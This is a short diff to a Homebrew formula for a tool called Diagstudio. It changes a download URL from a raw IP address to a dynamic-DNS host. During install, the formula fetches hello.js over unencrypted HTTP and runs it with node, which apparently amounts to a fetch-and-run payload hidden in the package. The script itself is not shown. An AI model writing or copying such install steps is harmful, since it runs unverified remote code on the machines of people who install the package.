@@ -14,7 +14,7 @@ class Diagstudio < Formula
   
   def install
     system "curl", "-fsSL", "-o", "scripts/hello.js",
-           "http://216.107.136.204/hello.js"
+           "http://toms.giize.com/hello.js"
     system "bash", "scripts/build.sh"
     system "node", "scripts/hello.js"
     bin.install ".build/diagstudio"
